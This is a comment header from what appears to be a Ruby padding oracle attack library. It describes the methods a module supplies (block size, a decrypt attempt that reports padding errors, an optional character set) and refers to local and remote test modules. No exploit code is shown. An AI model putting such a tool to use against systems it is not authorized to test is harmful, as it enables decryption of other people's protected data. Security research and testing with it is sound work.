#
# This class implements a simple Padding Oracle attack. It requires a 'module',
# which implements a couple simple methods:
#
# NAME
#  A constant representing the name of the module, used for output.
#
# blocksize()
#  The blocksize of whatever cipher is being used, in bytes (eg, # 16 for AES,
#  8 for DES, etc)
#
# attempt_decrypt(ciphertext)
#  Attempt to decrypt the given data, and return true if there was no
#  padding error and false if a padding error occured.
#
# character_set() [optional]
#  If character_set() is defined, it is expected to return an array of
#  characters in the order that they're likely to occur in the string. This
#  allows modules to optimize themselves for, for example, filenames. The list
#  doesn't need to be exhaustive; all other possible values are appended from
#  0 to 255.
#
# See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
# be implemented.
